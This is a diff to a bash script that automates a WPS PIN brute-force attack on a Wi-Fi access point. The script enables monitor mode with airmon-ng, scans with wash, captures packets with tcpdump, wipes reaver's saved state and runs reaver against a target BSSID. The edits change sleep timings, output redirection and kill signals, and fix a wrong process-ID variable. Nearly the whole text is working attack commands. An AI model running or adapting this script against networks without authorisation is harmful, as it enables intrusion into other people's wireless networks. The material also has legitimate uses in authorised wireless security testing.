@@ -4,19 +4,19 @@ export ESSID="AP Essid"
 export CHAN=1
 
 service network-manager stop
-sleep 2
+sleep 5
 ifconfig wlan0 down
-sleep 2
+sleep 5
 killall wpa_supplicant
-sleep 2
+sleep 5
 
 airmon-ng start wlan0 ${CHAN}
 sleep 5
 
-wash -i mon0 -c ${CHAN} -o wash_log.txt &
+wash -i mon0 -c ${CHAN} 2>&1 > wash_log.txt &
 WASH_PID=$!
 sleep 20
-/bin/kill -SIGINT $WASH_PID
+/bin/kill -s SIGINT $WASH_PID
 
 tcpdump -i mon0 -s0 -w reaver_dump.pcap &
 TCPDUMP_PID=$!
@@ -26,10 +26,10 @@ rm ./*.wpc
 rm /etc/reaver/reaver.db
 rm /etc/reaver/*.wpc
 
-reaver -i mon0 -e "${ESSID}" -b ${BSSID} -c ${CHAN} -vv -S -o reaver_log.txt &
-REAVER_PID=$1
+reaver -i mon0 -e "${ESSID}" -b ${BSSID} -c ${CHAN} -vv -S 2>&1 > reaver_log.txt &
+REAVER_PID=$!
 sleep 60
 # ...and an alternative to -g that counts unsuccessful attempts.
-/bin/kill -SIGKILL $REAVER_PID
+/bin/kill -s SIGINT $REAVER_PID
 
-/bin/kill -SIGINT $TCPDUMP_PID
+/bin/kill -s SIGINT $TCPDUMP_PID
